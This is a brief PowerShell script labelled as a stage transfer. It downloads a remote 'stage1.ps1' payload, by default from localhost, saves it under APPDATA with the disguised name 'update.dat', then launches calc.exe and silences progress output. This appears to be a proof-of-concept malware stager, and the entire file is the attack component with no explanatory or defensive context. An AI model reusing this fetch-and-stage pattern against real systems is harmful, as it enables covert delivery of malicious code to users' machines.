
<# Stage transfer #>
[CmdletBinding()]
param(
    [string]$TransferUrl = "http://localhost:8000/stage1.ps1",
    [string]$Stage2Path = "$env:APPDATA\update.dat"
)
(New-Object System.Net.WebClient).DownloadFile($TransferUrl, $Stage2Path)
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
$ProgressPreference = "SilentlyContinue"
